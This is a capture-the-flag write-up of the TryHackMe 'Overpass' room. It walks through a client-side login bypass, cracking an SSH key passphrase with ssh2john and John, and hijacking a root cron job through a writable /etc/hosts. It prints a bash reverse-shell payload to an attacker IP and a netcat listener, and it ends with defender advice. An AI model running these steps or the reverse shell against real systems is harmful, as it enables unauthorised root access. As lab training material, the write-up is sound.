---
title: "Overpass"
date: 2026-04-22
platform: TryHackMe
difficulty: Easy
category: offensive
summary: "Bypassed client-side authentication, cracked an SSH key passphrase, and hijacked a root cron job via writable /etc/hosts."
---

## Overview

Overpass is an easy TryHackMe room that hammers three common entry-level lessons: **client-side authentication is not authentication**, **encrypted SSH keys can be cracked offline**, and **cron jobs that fetch from the internet are privesc-by-misconfiguration when DNS is writable**.

## Tools Used

- **nmap** for port scanning.
- **Browser dev tools** to inspect the auth JavaScript.
- **gobuster** to find authenticated paths.
- **ssh2john** and **John the Ripper** for cracking the key passphrase.
- **ssh** for the foothold.
- **python3 -m http.server** to host the malicious cron payload.
- **netcat** to catch the reverse shell.

## Methodology

**Step 1 - Service enumeration.** Two open ports: SSH on 22 and HTTP on 80. The web app shows a "secure password manager" landing page.

```bash
nmap -p- -sV <TARGET_IP>
```

**Step 2 - Find the client-side authentication.** Logging in with any random credentials and watching the browser dev tools (Network tab) shows the *login.js* file fetched. Reading it reveals the entire authentication runs client side: a fetch to */api/login* validates the credentials, and on success, **the JavaScript sets a cookie and redirects the browser**. There is no server-side enforcement.

Setting that cookie manually (DevTools → Application → Cookies → Add) and visiting the protected path lands on the authenticated dashboard, which exposes an SSH private key for the user.

**Step 3 - Crack the SSH key passphrase.** The recovered key is encrypted. **ssh2john** converts the encrypted key file into a hash format John can crack.

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Once the passphrase is recovered, the key can be used to SSH in.

```bash
chmod 600 id_rsa
ssh -i id_rsa james@<TARGET_IP>
```

**Step 4 - Find the privesc.** Enumerating cron jobs reveals that root runs a *backup script* every minute that does:

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Two observations make this exploitable:

- *overpass.thm* is not in DNS. The script silently fails every minute, but the cron keeps running.
- */etc/hosts* on the target is writable by james, so the domain can be pointed anywhere.

**Step 5 - Hijack the domain locally.** Adding *overpass.thm* to /etc/hosts pointing at the attacker IP redirects the cron job's curl to the attacker box.

```bash
echo "<KALI_IP> overpass.thm" >> /etc/hosts
```

**Step 6 - Serve a malicious payload.** A Python HTTP server on Kali hosts a malicious *buildscript.sh* at the exact path the cron job requests.

```bash
mkdir -p downloads/src
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > downloads/src/buildscript.sh
sudo python3 -m http.server 80
```

```bash
# listener:
nc -lvnp 4444
```

Within one minute, cron fetches and executes the payload as root, and a root shell calls back.

## Key Takeaways

- **Client-side authentication is decoration, not security.** If the user's browser is allowed to decide whether they're authenticated, the user can lie. Every authentication decision must be enforced server-side.
- **Encrypted SSH keys are crackable when the passphrase is weak.** ssh2john converts the key to a hash format John can attack with rockyou. A strong passphrase is the only defense.
- **Cron jobs that fetch from the internet are privesc-by-misconfiguration.** If the user can influence what the URL resolves to, they can execute arbitrary code as the cron user.
- **Writable /etc/hosts plus a non-existent domain in a root cron is a one-shot privesc.** Check who can write to /etc/hosts and /etc/resolv.conf on every Linux foothold.

## What a Defender Should Do

- Enforce *every* authentication and authorization decision on the server. Treat client-side JavaScript and cookies as untrusted input.
- Require strong passphrases on SSH private keys. Better: distribute keys through a hardware token (YubiKey, smartcard) that does not export.
- Audit cron jobs and systemd timers for any line that fetches from the internet. Replace dynamic fetches with packaged code from a controlled repository.
- Lock down /etc/hosts to root-only writes (it usually is, but verify). The same applies to /etc/resolv.conf and /etc/nsswitch.conf.
- If a cron must fetch from a remote URL, pin the URL by IP (or use HTTPS with cert pinning) so a writable hostname mapping cannot redirect it.
